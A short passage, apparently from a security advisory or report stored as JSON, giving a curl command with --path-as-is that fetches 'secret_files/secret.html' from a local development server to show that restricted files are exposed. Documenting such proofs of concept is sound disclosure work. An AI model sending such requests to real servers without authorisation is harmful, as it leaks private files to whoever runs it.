following command:\n\n`curl  -v  --path-as-is  'http:\/\/localhost:5173\/secret_files\/secret.html'`\n\nYou will receive the contents of secret_files\/secret.html.",
